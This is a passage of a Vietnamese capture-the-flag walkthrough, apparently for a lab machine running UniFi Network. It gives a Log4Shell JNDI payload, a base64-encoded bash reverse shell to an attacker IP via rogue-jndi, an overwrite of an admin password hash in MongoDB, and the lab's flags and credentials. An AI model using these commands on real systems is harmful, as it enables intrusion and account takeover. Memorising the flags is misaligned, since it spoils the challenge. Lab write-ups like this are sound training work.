Để xác nhận việc khai thác `Log4Shell` thành công, tiến hành theo dõi lưu lượng mạng giữa target và máy attacker. Sử dụng công cụ `tcpdump` để bắt các gói tin mạng trên giao diện VPN (tun0) tại cổng `LDAP (389)` bằng cách thực hiện câu lệnh:
```bash
sudo tcpdump -i tun0 port 389
```
Gửi payload Log4Shell thông qua một HTTP POST request đến endpoint `/api/login`:
```bash
curl -k -X POST https://10.129.52.91:8443/api/login \
-H "Content-Type: application/json" \
-d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.54/abc}"}'
```

![alt text](/images/<Screenshot 2026-03-25 192036.png>)

Sau khi gửi payload, trên cửa sổ tcpdump ghi nhận được kết nối từ target đến máy attacker thông qua giao thức `LDAP`:

![alt text](/images/image-58.png)

Điều này chứng tỏ:
- Server đã thực hiện JNDI lookup
- Payload đã được thực thi
- Ứng dụng tồn tại lỗ hổng Log4Shell

### Task 7:What port do we need to inspect intercepted traffic for?
Để theo dõi lưu lượng mạng phục vụ cho việc xác nhận khai thác, cần kiểm tra traffic trên cổng `389`, là cổng mặc định của giao thức `LDAP` được sử dụng trong `JNDI injection`.

### Task 8: What port is the MongoDB service running on?
Để khai thác sâu hơn, trước hết cần có được shell của hệ thống.

#### Cài đặt các công cụ cần thiết
Để thực hiện khai thác lỗ hổng `Log4Shell`, cần cài đặt môi trường Java và các công cụ hỗ trợ build payload.
Tiến hành cập nhật danh sách package và cài đặt các thành phần cần thiết:
```bash
sudo apt update
sudo apt install openjdk-11-jdk maven -y
```
Trong đó:
- OpenJDK 11: cung cấp môi trường chạy và phát triển ứng dụng Java.
- Maven: công cụ quản lý và build project Java.

Ngoài ra, cần chuẩn bị công cụ khai thác, cụ thể ở đây là `rogue-jndi` - dùng để tạo LDAP server giả, phục vụ cho việc khai thác lỗ hổng `JNDI injection`. Tiến hành tải source code và build project:
```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```
Sau khi build thành công, file thực thi sẽ được lưu tạo `target/RogueJndi-1.1.jar`.

### Reverse Shell
Tạo payload reverse shell và encode bằng base64:
```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.14.54/4444 0>&1' | base64
```
Sau đó sử dụng rogue-jndi để dựng LDAP server:

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" \
--hostname "10.10.14.54"
```
Trong đó: `BASE64` chính là mã được sinh ra từ câu lệnh trước đó.

![alt text](/images/image-59.png)

Sau khi đã dựng được LDAP server độc hại, tiến hành thiết lập listener để nhận reverse shell tại `termainal thứ 2` khác: 
```bash
nc -lvnp 4444
```

Tại `terminal thứ 3`, thực hiện tấn công bằng cách gửi payload đến server thông qua endpoint `/api/login`:
```bash
curl -k -X POST https://10.129.52.91:8443/api/login \
-H "Content-Type: application/json" \
-d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.54:1389/o=tomcat}"}'
```

Sau khi gửi payload, `terminal thứ 2` sẽ nhận được reverse shell từ target:

![alt text](/images/image-60.png)

Sau khi vào được shell, tiến hành kiểm tra port mà dịch vụ MongoDB đang chạy bằng lệnh:
```bash
ps aux | grep mongo
```
Kết quả cho thấy dịch vụ MongoDB đang chạy trên port `27117`.

![alt text](/images/image-61.png)

### Task 9: What is the default database name for UniFi applications?
Thực hiện kết nối với dịch vụ MongoDB theo port `27117` đã được xác định trước đó:
```bash
mongo --port 27117
```
Trong `MongoDB Shell`, thực hiện: `show dbs`. Kết quả thu được: 
- ace       0.002GB
- ace_stat  0.000GB
- admin     0.000GB
- config    0.000GB
- local     0.000GB

Trong danh dách trên, `ace` là database chính được sử dụng bởi ứng dụng `UniFi Network` để lưu trữ cấu hình và dữ liệu hệ thống.

![alt text](/images/image-62.png)

### Task 10: What is the function we use to enumerate users within the database in MongoDB?
Sử dụng lệnh `db.admin.find()` để liệt kê các user được lưu trong database của ứng dụng UniFi. Kết quả trả về thông tin người dùng, bao gồm username và password hash.

![alt text](/images/image-64.png)

### Task 11: What is the function we use to update users within the database in MongoDB?
Để cập nhật thông tin người dùng trong database, sử dụng function `db.admin.update()` để chỉnh sửa dữ liệu trong collection admin.

### Task 12: What is the password for the root user?
Trước tiên cần truy cập vào database của `UniFi Network` (ace) và truy vấn thông tin người dùng trong collection `admin`:
```bash
use ace
db.admin.find().pretty()
```
Sau khi thực thi 2 lệnh trên, hệ thống trả về 2 thông tin quan trọng:
- `Username = administrator`
- `Password hash = $6$Ry6Vdbse$8enMR5Zn...`

Password là mã hash sử dụng thuật toán `SHA-512 crypt`, một thuật toán có độ dài lớn và độ phức tạp cao. Do đó, việc crack hash này bằng phương pháp brute-force hoặc wordlist sẽ:
- Tốn nhiều thời gian.
- Không đảm bảo đáp ứng đủ tài nguyên.

![alt text](/images/image-65.png)

Thay vì tiến hành crack hash, có thể tận dụng quyền truy cập hiện tại vào `MongoDB` để thay thế trực tiếp giá trị hash bằng một hash mới do ta tự tạo ra. Do MongoDB không yêu cầu xác thực và cho phép chỉnh sửa dữ liệu, ta có thể:
- Tạo một hash `SHA-512 mới` với mật khẩu tùy chọn.
- Ghi đè vào `trường x_shadow` của user `administrator`.

Trên Kali Linux, tạo một hash mới từ pass `Password1234` bằng lệnh:
```bash
mkpasswd -m sha-512 Password1234
```
![alt text](/images/image-67.png)

Sau đó, tiến hành cập nhật password hash mới trong MongoDB:
```bash
use ace
db.admin.update(
  {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
  {$set: {"x_shadow": "NEW_HASH"}}
)
```
Sau khi thực hiện lệnh update, hệ thống trả về: 
```bash
WriteResult({ "nMatched" : 1, "nModified" : 1 })
```
Điều này xác nhận password hash mới đã được cập nhật thành công.

![alt text](/images/image-66.png)

Sử dụng thông tin đăng nhập mới để đăng nhập vào hệ thống UniFi dưới quyền `admin`:

![alt text](/images/image-68.png)

Truy cập vào phần `Settings`, ta sẽ có được username và password của root user:
- `username = root`
- `password = NotACrackablePassword4U2022`

![alt text](/images/image-69.png)

### TÌM FLAG
#### User Flag
Do thư mục home của user hiện tại không chứa flag, thực hiện liệt kê các user khác trên hệ thống bằng lệnh `ls /home` thì phát hiện có một user khác tên `michael`. Tiến hành kiểm di chuyển đến và kiểm tra user đó:
```bash
cd /home/michael; ls
```
Kết quả phát hiện file `userflag.txt` - tập tin chứa userflag của hệ thống. Sau khi thực hiện lệnh `cat`, ta thu được flag là `6ced1a6a89e666c0620cdb10262ba127`.

![alt text](/images/image-70.png)

#### Root Flag
Sau khi thu thập được thông tin xác thực SSH từ giao diện quản trị `UniFi`, tiến hành leo quyền lên root. Khi sử dụng lệnh `su root` để xác thực trong reverse shell, hệ thống sẽ báo lỗi: `su: must be run from a terminal`. Điều này xảy ra do reverse shell không cung cấp một `interactive TTY`, khiến các lệnh yêu cầu terminal như su không thể thực thi.

Do hệ thống đã bật tính năng `SSH Authentication` trong phần cấu hình `UniFi` và cung cấp sẵn thông tin đăng nhập, ta có thể sử dụng SSH để truy cập trực tiếp với quyền root.

![alt text](/images/image-72.png)

Trên Kali Linux, thực hiện lệnh: 
```bash
ssh root@10.129.52.91
```
Sau đó xác thực với password: `ssh root@10.129.52.91`.

Sau khi truy cập thành công, tiến hành kiểm tra và chạy lệnh `cat /root/root.txt`. Root flag của hệ thống là: `e50bc93c75b634e4b272d2f771c33681`.

![alt text](/images/image-73.png)

![alt text](/images/image-74.png)


